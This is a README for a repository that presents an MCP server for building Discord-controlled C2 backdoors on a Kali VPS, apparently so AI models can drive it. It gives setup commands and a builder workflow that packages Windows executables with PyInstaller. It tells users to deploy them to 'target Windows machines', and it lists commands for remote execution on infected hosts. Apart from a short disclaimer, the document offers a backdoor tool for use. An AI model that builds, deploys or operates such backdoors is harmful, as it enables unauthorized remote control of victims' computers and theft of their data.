# MCP Kali Server - Discord C2 Builder

A complete MCP (Model Context Protocol) server setup for building Discord C2 backdoors using a Hostinger Kali Linux VPS.

## Features

- **Web Interface**: Browser-based interface for building C2 backdoors
- **Discord C2**: Automated Discord bot backdoor generation
- **Profile Management**: Save and load Discord bot configurations
- **Executable Building**: Creates Windows .exe files using PyInstaller
- **Hostinger Integration**: Works with Hostinger Kali Linux VPS

## Quick Setup

### 1. Kali Server Setup
```bash
# Clone the repository on your Kali machine
git clone https://github.com/Visionbones/Windows.git
cd Windows

# Run the setup script
chmod +x setup.sh
./setup.sh

# Start the server
python3 kali_server.py
```

### 2. Local Interface
Open `hostinger_kali_interface.html` in your browser to access the web interface.

## File Structure

```
├── hostinger_kali_interface.html  # Main web interface
├── dystopia_windows_builder.py    # Core builder script
├── kali_server.py                 # Kali server for Hostinger
├── libraries/                     # Core C2 libraries
├── templates/                     # Payload templates
├── requirements.txt               # Python dependencies
└── setup.sh                      # Setup script
```

## Usage

1. **Configure Discord Bot**: Create a Discord bot and get the token, guild ID, and channel ID
2. **Save Profile**: Use the profile management system to save your configurations
3. **Build C2**: Select Discord payload and build the executable
4. **Deploy**: Transfer the .exe to target Windows machines

## Discord C2 Commands

- `!c2exec <command>` - Execute system commands
- `!c2info` - Get system information

## Requirements

- Kali Linux (tested on Hostinger VPS)
- Python 3.8+
- PyInstaller
- Discord.py
- Flask

## Security Note

This tool is for educational and authorized penetration testing purposes only. Use responsibly and only on systems you own or have explicit permission to test.